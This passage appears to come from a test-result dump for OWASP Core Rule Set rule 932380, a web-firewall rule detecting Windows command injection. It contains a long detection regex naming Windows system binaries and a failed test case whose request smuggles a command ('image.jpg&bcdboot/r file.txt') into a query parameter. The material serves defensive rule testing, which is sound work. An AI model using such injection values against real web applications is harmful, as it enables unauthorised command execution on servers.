\"\\^]*t[\\\"\\^]*v[\\\"\\^]*o[\\\"\\^]*l|q[\\\"\\^]*(?:b[\\\"\\^]*k[\\\"\\^]*u[\\\"\\^]*p|(?:t[\\\"\\^]*g[\\\"\\^]*)?s[\\\"\\^]*v[\\\"\\^]*c)|s[\\\"\\^]*(?:d[\\\"\\^]*t|i[\\\"\\^]*(?:e[\\\"\\^]*x[\\\"\\^]*e[\\\"\\^]*c|n[\\\"\\^]*f[\\\"\\^]*o[\\\"\\^]*3[\\\"\\^]*2)|t[\\\"\\^]*s[\\\"\\^]*c))|n[\\\"\\^]*(?:b[\\\"\\^]*t[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*a[\\\"\\^]*t|e[\\\"\\^]*t[\\\"\\^]*(?:c[\\\"\\^]*f[\\\"\\^]*g|d[\\\"\\^]*o[\\\"\\^]*m|s[\\\"\\^]*(?:h|t[\\\"\\^]*a[\\\"\\^]*t))|f[\\\"\\^]*s[\\\"\\^]*(?:a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i[\\\"\\^]*n|s[\\\"\\^]*(?:h[\\\"\\^]*a[\\\"\\^]*r[\\\"\\^]*e|t[\\\"\\^]*a[\\\"\\^]*t))|l[\\\"\\^]*(?:b[\\\"\\^]*m[\\\"\\^]*g[\\\"\\^]*r|t[\\\"\\^]*e[\\\"\\^]*s[\\\"\\^]*t)|s[\\\"\\^]*l[\\\"\\^]*o[\\\"\\^]*o[\\\"\\^]*k[\\\"\\^]*u[\\\"\\^]*p|t[\\\"\\^]*(?:b[\\\"\\^]*a[\\\"\\^]*c[\\\"\\^]*k[\\\"\\^]*u[\\\"\\^]*p|c[\\\"\\^]*m[\\\"\\^]*d[\\\"\\^]*p[\\\"\\^]*r[\\\"\\^]*o[\\\"\\^]*m[\\\"\\^]*p[\\\"\\^]*t|f[\\\"\\^]*r[\\\"\\^]*s[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*l))|o[\\\"\\^]*(?:f[\\\"\\^]*f[\\\"\\^]*l[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*e|p[\\\"\\^]*e[\\\"\\^]*n[\\\"\\^]*f[\\\"\\^]*i[\\\"\\^]*l[\\\"\\^]*e[\\\"\\^]*s)|p[\\\"\\^]*(?:a[\\\"\\^]*(?:g[\\\"\\^]*e[\\\"\\^]*f[\\\"\\^]*i[\\\"\\^]*l[\\\"\\^]*e[\\\"\\^]*c[\\\"\\^]*o[\\\"\\^]*n[\\\"\\^]*f[\\\"\\^]*i|t[\\\"\\^]*h[\\\"\\^]*p[\\\"\\^]*i[\\\"\\^]*n)[\\\"\\^]*g|(?:b[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i|k[\\\"\\^]*t[\\\"\\^]*m[\\\"\\^]*o)[\\\"\\^]*n|e[\\\"\\^]*(?:n[\\\"\\^]*t[\\\"\\^]*n[\\\"\\^]*t|r[\\\"\\^]*f[\\\"\\^]*m[\\\"\\^]*o[\\\"\\^]*n)|n[\\\"\\^]*p[\\\"\\^]*u[\\\"\\^]*(?:n[\\\"\\^]*a[\\\"\\^]*t[\\\"\\^]*t[\\\"\\^]*e[\\\"\\^]*n[\\\"\\^]*d|t[\\\"\\^]*i[\\\"\\^]*l)|o[\\\"\\^]*(?:p[\\\"\\^]*d|w[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*s[\\\"\\^]*h[\\\"\\^]*e[\\\"\\^]*l[\\\"\\^]*l)|r[\\\"\\^]*n[\\\"\\^]*(?:c[\\\"\\^]*n[\\\"\\^]*f[\\\"\\^]*g|(?:d[\\\"\\^]*r[\\\"\\^]*v|m[\\\"\\^]*n[\\\"\\^]*g)[\\\"\\^]*r|j[\\\"\\^]*o[\\\"\\^]*b[\\\"\\^]*s|p[\\\"\\^]*o[\\\"\\^]*r[\\\"\\^]*t|q[\\\"\\^]*c[\\\"\\^]*t[\\\"\\^]*l)|u[\\\"\\^]*(?:b[\\\"\\^]*p[\\\"\\^]*r[\\\"\\^]*n|s[\\\"\\^]*h[\\\"\\^]*(?:d|p[\\\"\\^]*r[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*t[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*c[\\\"\\^]*o[\\\"\\^]*n[\\\"\\^]*n[\\\"\\^]*e[\\\"\\^]*c[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*o[\\\"\\^]*n[\\\"\\^]*s))|w[\\\"\\^]*(?:l[\\\"\\^]*a[\\\"\\^]*u[\\\"\\^]*n[\\\"\\^]*c[\\\"\\^]*h[\\\"\\^]*e[\\\"\\^]*r|s[\\\"\\^]*h))|q[\\\"\\^]*(?:a[\\\"\\^]*p[\\\"\\^]*p[\\\"\\^]*s[\\\"\\^]*r[\\\"\\^]*v|p[\\\"\\^]*r[\\\"\\^]*o[\\\"\\^]*c[\\\"\\^]*e[\\\"\\^]*s[\\\"\\^]*s|u[\\\"\\^]*s[\\\"\\^]*e[\\\"\\^]*r|w[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*a)|r[\\\"\\^]*(?:d(?:[\\\"\\^]*p[\\\"\\^]*s[\\\"\\^]*i[\\\"\\^]*g[\\\"\\^]*n)?|e[\\\"\\^]*(?:f[\\\"\\^]*s[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*l|g(?:[\\\"\\^]*(?:i[\\\"\\^]*n[\\\"\\^]*i|s[\\\"\\^]*v[\\\"\\^]*r[\\\"\\^]*3[\\\"\\^]*2))?|l[\\\"\\^]*o[\\\"\\^]*g|(?:(?:p[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i|s[\\\"\\^]*c[\\\"\\^]*a)[\\\"\\^]*)?n|x[\\\"\\^]*e[\\\"\\^]*c)|i[\\\"\\^]*s[\\\"\\^]*e[\\\"\\^]*t[\\\"\\^]*u[\\\"\\^]*p|m[\\\"\\^]*d[\\\"\\^]*i[\\\"\\^]*r|o[\\\"\\^]*b[\\\"\\^]*o[\\\"\\^]*c[\\\"\\^]*o[\\\"\\^]*p[\\\"\\^]*y|p[\\\"\\^]*c[\\\"\\^]*(?:i[\\\"\\^]*n[\\\"\\^]*f[\\\"\\^]*o|p[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*g)|s[\\\"\\^]*h|u[\\\"\\^]*n[\\\"\\^]*d[\\\"\\^]*l[\\\"\\^]*l[\\\"\\^]*3[\\\"\\^]*2|w[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*a)|s[\\\"\\^]*(?:a[\\\"\\^]*n|c[\\\"\\^]*(?:h[\\\"\\^]*t[\\\"\\^]*a[\\\"\\^]*s[\\\"\\^]*k[\\\"\\^]*s|w[\\\"\\^]*c[\\\"\\^]*m[\\\"\\^]*d)|e[\\\"\\^]*(?:c[\\\"\\^]*e[\\\"\\^]*d[\\\"\\^]*i[\\\"\\^]*t|r[\\\"\\^]*v[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*(?:(?:c[\\\"\\^]*e[\\\"\\^]*i[\\\"\\^]*p|w[\\\"\\^]*e[\\\"\\^]*r)[\\\"\\^]*o[\\\"\\^]*p[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*n|m[\\\"\\^]*a[\\\"\\^]*n[\\\"\\^]*a[\\\"\\^]*g[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*c[\\\"\\^]*m[\\\"\\^]*d)|t[\\\"\\^]*x)|f[\\\"\\^]*c|(?:h[\\\"\\^]*o[\\\"\\^]*w[\\\"\\^]*m[\\\"\\^]*o[\\\"\\^]*u[\\\"\\^]*n|u[\\\"\\^]*b[\\\"\\^]*s)[\\\"\\^]*t|x[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*r[\\\"\\^]*a[\\\"\\^]*c[\\\"\\^]*e|y[\\\"\\^]*s[\\\"\\^]*(?:o[\\\"\\^]*c[\\\"\\^]*m[\\\"\\^]*g[\\\"\\^]*r|t[\\\"\\^]*e[\\\"\\^]*m[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*f[\\\"\\^]*o))|t[\\\"\\^]*(?:a[\\\"\\^]*(?:k[\\\"\\^]*e[\\\"\\^]*o[\\\"\\^]*w[\\\"\\^]*n|p[\\\"\\^]*i[\\\"\\^]*c[\\\"\\^]*f[\\\"\\^]*g|s[\\\"\\^]*k[\\\"\\^]*(?:k[\\\"\\^]*i[\\\"\\^]*l[\\\"\\^]*l|l[\\\"\\^]*i[\\\"\\^]*s[\\\"\\^]*t))|(?:c[\\\"\\^]*m[\\\"\\^]*s[\\\"\\^]*e[\\\"\\^]*t[\\\"\\^]*u|f[\\\"\\^]*t)[\\\"\\^]*p|(?:(?:e[\\\"\\^]*l[\\\"\\^]*n[\\\"\\^]*e|i[\\\"\\^]*m[\\\"\\^]*e[\\\"\\^]*o[\\\"\\^]*u)[\\\"\\^]*|r[\\\"\\^]*a[\\\"\\^]*c[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*(?:p[\\\"\\^]*)?)t|l[\\\"\\^]*n[\\\"\\^]*t[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*n|p[\\\"\\^]*m[\\\"\\^]*(?:t[\\\"\\^]*o[\\\"\\^]*o[\\\"\\^]*l|v[\\\"\\^]*s[\\\"\\^]*c[\\\"\\^]*m[\\\"\\^]*g[\\\"\\^]*r)|s[\\\"\\^]*(?:(?:d[\\\"\\^]*i[\\\"\\^]*s[\\\"\\^]*)?c[\\\"\\^]*o[\\\"\\^]*n|e[\\\"\\^]*c[\\\"\\^]*i[\\\"\\^]*m[\\\"\\^]*p|k[\\\"\\^]*i[\\\"\\^]*l[\\\"\\^]*l|p[\\\"\\^]*r[\\\"\\^]*o[\\\"\\^]*f)|y[\\\"\\^]*p[\\\"\\^]*e[\\\"\\^]*p[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*f|z[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*l)|u[\\\"\\^]*n[\\\"\\^]*(?:e[\\\"\\^]*x[\\\"\\^]*p[\\\"\\^]*o[\\\"\\^]*s[\\\"\\^]*e|i[\\\"\\^]*q[\\\"\\^]*u[\\\"\\^]*e[\\\"\\^]*i[\\\"\\^]*d|l[\\\"\\^]*o[\\\"\\^]*d[\\\"\\^]*c[\\\"\\^]*t[\\\"\\^]*r)|v[\\\"\\^]*s[\\\"\\^]*s[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i[\\\"\\^]*n|w[\\\"\\^]*(?:a[\\\"\\^]*i[\\\"\\^]*t[\\\"\\^]*f[\\\"\\^]*o[\\\"\\^]*r|b[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i[\\\"\\^]*n|(?:d[\\\"\\^]*s|e[\\\"\\^]*(?:c|v[\\\"\\^]*t))[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*l|h[\\\"\\^]*o[\\\"\\^]*a[\\\"\\^]*m[\\\"\\^]*i|i[\\\"\\^]*n[\\\"\\^]*(?:n[\\\"\\^]*t(?:[\\\"\\^]*3[\\\"\\^]*2)?|r[\\\"\\^]*s)|m[\\\"\\^]*i[\\\"\\^]*c|s[\\\"\\^]*c[\\\"\\^]*r[\\\"\\^]*i[\\\"\\^]*p[\\\"\\^]*t)|x[\\\"\\^]*c[\\\"\\^]*o[\\\"\\^]*p[\\\"\\^]*y)(?:\\.[\\\"\\^]*[0-9A-Z_a-z]+)?\\b"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932380
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows Command Injection"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932380",
    "test_id" : 3,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932380.yaml",
    "description" : "Windows shell command injection with 'bcdboot': view=image.jpg%26bcdboot/r file.txt\nMatch bcdboot with argument without preceding space\n",
    "cause" : "failed expect_id check: 932380 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 3,
      "desc" : "Windows shell command injection with 'bcdboot': view=image.jpg%26bcdboot/r file.txt\nMatch bcdboot with argument without preceding space\n",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "Proxy-Connection" : "keep-alive",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?view%3Dimage.jpg%26bcdboot%2Fr%20file.txt",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932380 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932380,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows shell command injections."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " New in CRSv4: The rules 932110 and 932115 were reorganized and renumbered to 932370 and 932380."
        }, {
          "type" : "Comment",
          "text" : " The new rules target specific Windows binaries to simplify future updates of the command list."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See rule 932370 above for further explanation."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is case-insensitive."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932380.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932380"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:[\\n\\r;`\\{]|\\|\\|?|&&?)[\\s\\x0b]*[\\s\\x0b\\\"'\\(,@]*(?:[\\\"'\\.-9A-Z_a-z]+/|(?:[\\\"'\\x5c\\^]*[0-9A-Z_a-z][\\\"'\\x5c\\^]*:[^\\x5c]*|[ \\\"'\\.-9A-Z\\x5c\\^_a-z]*)\\x5c)?[\\\"\\^]*(?:a[\\\"\\^]*(?:s[\\\"\\^]*s[\\\"\\^]*o[\\\"\\^]*c|t[\\\"\\^]*(?:m[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m|t[\\\"\\^]*r[\\\"\\^]*i[\\\"\\^]*b)|u[\\\"\\^]*(?:d[\\\"\\^]*i[\\\"\\^]*t[\\\"\\^]*p[\\\"\\^]*o[\\\"\\^]*l|t[\\\"\\^]*o[\\\"\\^]*(?:c[\\\"\\^]*(?:h[\\\"\\^]*k|o[\\\"\\^]*n[\\\"\\^]*v)|(?:f[\\\"\\^]*m|m[\\\"\\^]*o[\\\"\\^]*u[\\\"\\^]*n)[\\\"\\^]*t)))|b[\\\"\\^]*(?:c[\\\"\\^]*d[\\\"\\^]*(?:b[\\\"\\^]*o[\\\"\\^]*o|e[\\\"\\^]*d[\\\"\\^]*i)[\\\"\\^]*t|(?:d[\\\"\\^]*e[\\\"\\^]*h[\\\"\\^]*d|o[\\\"\\^]*o[\\\"\\^]*t)[\\\"\\^]*c[\\\"\\^]*f[\\\"\\^]*g|i[\\\"\\^]*t[\\\"\\^]*s[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i[\\\"\\^]*n)|c[\\\"\\^]*(?:a[\\\"\\^]*c[\\\"\\^]*l[\\\"\\^]*s|e[\\\"\\^]*r[\\\"\\^]*t[\\\"\\^]*(?:r[\\\"\\^]*e[\\\"\\^]*q|u[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*l)|h[\\\"\\^]*(?:c[\\\"\\^]*p|d[\\\"\\^]*i[\\\"\\^]*r|g[\\\"\\^]*(?:l[\\\"\\^]*o[\\\"\\^]*g[\\\"\\^]*o[\\\"\\^]*n|p[\\\"\\^]*o[\\\"\\^]*r[\\\"\\^]*t|u[\\\"\\^]*s[\\\"\\^]*r)|k[\\\"\\^]*(?:d[\\\"\\^]*s[\\\"\\^]*k|n[\\\"\\^]*t[\\\"\\^]*f[\\\"\\^]*s))|l[\\\"\\^]*e[\\\"\\^]*a[\\\"\\^]*n[\\\"\\^]*m[\\\"\\^]*g[\\\"\\^]*r|m[\\\"\\^]*(?:d(?:[\\\"\\^]*k[\\\"\\^]*e[\\\"\\^]*y)?|s[\\\"\\^]*t[\\\"\\^]*p)|s[\\\"\\^]*c[\\\"\\^]*r[\\\"\\^]*i[\\\"\\^]*p[\\\"\\^]*t)|d[\\\"\\^]*(?:c[\\\"\\^]*(?:d[\\\"\\^]*i[\\\"\\^]*a[\\\"\\^]*g|g[\\\"\\^]*p[\\\"\\^]*o[\\\"\\^]*f[\\\"\\^]*i[\\\"\\^]*x)|e[\\\"\\^]*(?:f[\\\"\\^]*r[\\\"\\^]*a[\\\"\\^]*g|l)|f[\\\"\\^]*s[\\\"\\^]*(?:d[\\\"\\^]*i[\\\"\\^]*a|r[\\\"\\^]*m[\\\"\\^]*i)[\\\"\\^]*g|i[\\\"\\^]*(?:a[\\\"\\^]*n[\\\"\\^]*t[\\\"\\^]*z|r|s[\\\"\\^]*(?:k[\\\"\\^]*(?:c[\\\"\\^]*o[\\\"\\^]*(?:m[\\\"\\^]*p|p[\\\"\\^]*y)|p[\\\"\\^]*(?:a[\\\"\\^]*r[\\\"\\^]*t|e[\\\"\\^]*r[\\\"\\^]*f)|r[\\\"\\^]*a[\\\"\\^]*i[\\\"\\^]*d|s[\\\"\\^]*h[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*o[\\\"\\^]*w)|p[\\\"\\^]*d[\\\"\\^]*i[\\\"\\^]*a[\\\"\\^]*g))|n[\\\"\\^]*s[\\\"\\^]*c[\\\"\\^]*m[\\\"\\^]*d|(?:o[\\\"\\^]*s[\\\"\\^]*k[\\\"\\^]*e|r[\\\"\\^]*i[\\\"\\^]*v[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*q[\\\"\\^]*u[\\\"\\^]*e[\\\"\\^]*r)[\\\"\\^]*y)|e[\\\"\\^]*(?:n[\\\"\\^]*d[\\\"\\^]*l[\\\"\\^]*o[\\\"\\^]*c[\\\"\\^]*a[\\\"\\^]*l|v[\\\"\\^]*e[\\\"\\^]*n[\\\"\\^]*t[\\\"\\^]*c[\\\"\\^]*r[\\\"\\^]*e[\\\"\\^]*a[\\\"\\^]*t[\\\"\\^]*e)|E[\\\"\\^]*v[\\\"\\^]*n[\\\"\\^]*t[\\\"\\^]*c[\\\"\\^]*m[\\\"\\^]*d|f[\\\"\\^]*(?:c|i[\\\"\\^]*(?:l[\\\"\\^]*e[\\\"\\^]*s[\\\"\\^]*y[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*e[\\\"\\^]*m[\\\"\\^]*s|n[\\\"\\^]*d[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*r)|l[\\\"\\^]*a[\\\"\\^]*t[\\\"\\^]*t[\\\"\\^]*e[\\\"\\^]*m[\\\"\\^]*p|o[\\\"\\^]*r[\\\"\\^]*f[\\\"\\^]*i[\\\"\\^]*l[\\\"\\^]*e[\\\"\\^]*s|r[\\\"\\^]*e[\\\"\\^]*e[\\\"\\^]*d[\\\"\\^]*i[\\\"\\^]*s[\\\"\\^]*k|s[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*l|(?:t[\\\"\\^]*y[\\\"\\^]*p|v[\\\"\\^]*e[\\\"\\^]*u[\\\"\\^]*p[\\\"\\^]*d[\\\"\\^]*a[\\\"\\^]*t)[\\\"\\^]*e)|g[\\\"\\^]*(?:e[\\\"\\^]*t[\\\"\\^]*(?:m[\\\"\\^]*a[\\\"\\^]*c|t[\\\"\\^]*y[\\\"\\^]*p[\\\"\\^]*e)|o[\\\"\\^]*t[\\\"\\^]*o|p[\\\"\\^]*(?:f[\\\"\\^]*i[\\\"\\^]*x[\\\"\\^]*u[\\\"\\^]*p|(?:r[\\\"\\^]*e[\\\"\\^]*s[\\\"\\^]*u[\\\"\\^]*l[\\\"\\^]*)?t|u[\\\"\\^]*p[\\\"\\^]*d[\\\"\\^]*a[\\\"\\^]*t[\\\"\\^]*e)|r[\\\"\\^]*a[\\\"\\^]*f[\\\"\\^]*t[\\\"\\^]*a[\\\"\\^]*b[\\\"\\^]*l)|h[\\\"\\^]*(?:e[\\\"\\^]*l[\\\"\\^]*p[\\\"\\^]*c[\\\"\\^]*t[\\\"\\^]*r|o[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*n[\\\"\\^]*a[\\\"\\^]*m[\\\"\\^]*e)|i[\\\"\\^]*(?:c[\\\"\\^]*a[\\\"\\^]*c[\\\"\\^]*l[\\\"\\^]*s|p[\\\"\\^]*(?:c[\\\"\\^]*o[\\\"\\^]*n[\\\"\\^]*f[\\\"\\^]*i[\\\"\\^]*g|x[\\\"\\^]*r[\\\"\\^]*o[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*e)|r[\\\"\\^]*f[\\\"\\^]*t[\\\"\\^]*p)|j[\\\"\\^]*e[\\\"\\^]*t[\\\"\\^]*p[\\\"\\^]*a[\\\"\\^]*c[\\\"\\^]*k|k[\\\"\\^]*(?:l[\\\"\\^]*i[\\\"\\^]*s[\\\"\\^]*t|s[\\\"\\^]*e[\\\"\\^]*t[\\\"\\^]*u[\\\"\\^]*p|t[\\\"\\^]*(?:m[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*i[\\\"\\^]*l|p[\\\"\\^]*a[\\\"\\^]*s[\\\"\\^]*s))|l[\\\"\\^]*(?:o[\\\"\\^]*(?:d[\\\"\\^]*c[\\\"\\^]*t[\\\"\\^]*r|g[\\\"\\^]*(?:m[\\\"\\^]*a[\\\"\\^]*n|o[\\\"\\^]*f[\\\"\\^]*f))|p[\\\"\\^]*[qr])|m[\\\"\\^]*(?:a[\\\"\\^]*(?:c[\\\"\\^]*f[\\\"\\^]*i[\\\"\\^]*l[\\\"\\^]*e|k[\\\"\\^]*e[\\\"\\^]*c[\\\"\\^]*a[\\\"\\^]*b|p[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i[\\\"\\^]*n)|k[\\\"\\^]*(?:d[\\\"\\^]*i[\\\"\\^]*r|l[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*k)|m[\\\"\\^]*c|o[\\\"\\^]*u[\\\"\\^]*n[\\\"\\^]*t[\\\"\\^]*v[\\\"\\^]*o[\\\"\\^]*l|q[\\\"\\^]*(?:b[\\\"\\^]*k[\\\"\\^]*u[\\\"\\^]*p|(?:t[\\\"\\^]*g[\\\"\\^]*)?s[\\\"\\^]*v[\\\"\\^]*c)|s[\\\"\\^]*(?:d[\\\"\\^]*t|i[\\\"\\^]*(?:e[\\\"\\^]*x[\\\"\\^]*e[\\\"\\^]*c|n[\\\"\\^]*f[\\\"\\^]*o[\\\"\\^]*3[\\\"\\^]*2)|t[\\\"\\^]*s[\\\"\\^]*c))|n[\\\"\\^]*(?:b[\\\"\\^]*t[\\\"\\^]*s[\\\"\\^]*t[\\\"\\^]*a[\\\"\\^]*t|e[\\\"\\^]*t[\\\"\\^]*(?:c[\\\"\\^]*f[\\\"\\^]*g|d[\\\"\\^]*o[\\\"\\^]*m|s[\\\"\\^]*(?:h|t[\\\"\\^]*a[\\\"\\^]*t))|f[\\\"\\^]*s[\\\"\\^]*(?:a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i[\\\"\\^]*n|s[\\\"\\^]*(?:h[\\\"\\^]*a[\\\"\\^]*r[\\\"\\^]*e|t[\\\"\\^]*a[\\\"\\^]*t))|l[\\\"\\^]*(?:b[\\\"\\^]*m[\\\"\\^]*g[\\\"\\^]*r|t[\\\"\\^]*e[\\\"\\^]*s[\\\"\\^]*t)|s[\\\"\\^]*l[\\\"\\^]*o[\\\"\\^]*o[\\\"\\^]*k[\\\"\\^]*u[\\\"\\^]*p|t[\\\"\\^]*(?:b[\\\"\\^]*a[\\\"\\^]*c[\\\"\\^]*k[\\\"\\^]*u[\\\"\\^]*p|c[\\\"\\^]*m[\\\"\\^]*d[\\\"\\^]*p[\\\"\\^]*r[\\\"\\^]*o[\\\"\\^]*m[\\\"\\^]*p[\\\"\\^]*t|f[\\\"\\^]*r[\\\"\\^]*s[\\\"\\^]*u[\\\"\\^]*t[\\\"\\^]*l))|o[\\\"\\^]*(?:f[\\\"\\^]*f[\\\"\\^]*l[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*e|p[\\\"\\^]*e[\\\"\\^]*n[\\\"\\^]*f[\\\"\\^]*i[\\\"\\^]*l[\\\"\\^]*e[\\\"\\^]*s)|p[\\\"\\^]*(?:a[\\\"\\^]*(?:g[\\\"\\^]*e[\\\"\\^]*f[\\\"\\^]*i[\\\"\\^]*l[\\\"\\^]*e[\\\"\\^]*c[\\\"\\^]*o[\\\"\\^]*n[\\\"\\^]*f[\\\"\\^]*i|t[\\\"\\^]*h[\\\"\\^]*p[\\\"\\^]*i[\\\"\\^]*n)[\\\"\\^]*g|(?:b[\\\"\\^]*a[\\\"\\^]*d[\\\"\\^]*m[\\\"\\^]*i|k[\\\"\\^]*t[\\\"\\^]*m[\\\"\\^]*o)[\\\"\\^]*n|e[\\\"\\^]*(?:n[\\\"\\^]*t[\\\"\\^]*n[\\\"\\^]*t|r[\\\"\\^]*f[\\\"\\^]*m[\\\"\\^]*o[\\\"\\^]*n)|n[\\\"\\^]*p[\\\"\\^]*u[\\\"\\^]*(?:n[\\\"\\^]*a[\\\"\\^]*t[\\\"\\^]*t[\\\"\\^]*e[\\\"\\^]*n[\\\"\\^]*d|t[\\\"\\^]*i[\\\"\\^]*l)|o[\\\"\\^]*(?:p[\\\"\\^]*d|w[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*s[\\\"\\^]*h[\\\"\\^]*e[\\\"\\^]*l[\\\"\\^]*l)|r[\\\"\\^]*n[\\\"\\^]*(?:c[\\\"\\^]*n[\\\"\\^]*f[\\\"\\^]*g|(?:d[\\\"\\^]*r[\\\"\\^]*v|m[\\\"\\^]*n[\\\"\\^]*g)[\\\"\\^]*r|j[\\\"\\^]*o[\\\"\\^]*b[\\\"\\^]*s|p[\\\"\\^]*o[\\\"\\^]*r[\\\"\\^]*t|q[\\\"\\^]*c[\\\"\\^]*t[\\\"\\^]*l)|u[\\\"\\^]*(?:b[\\\"\\^]*p[\\\"\\^]*r[\\\"\\^]*n|s[\\\"\\^]*h[\\\"\\^]*(?:d|p[\\\"\\^]*r[\\\"\\^]*i[\\\"\\^]*n[\\\"\\^]*t[\\\"\\^]*e[\\\"\\^]*r[\\\"\\^]*c[\\\"\\^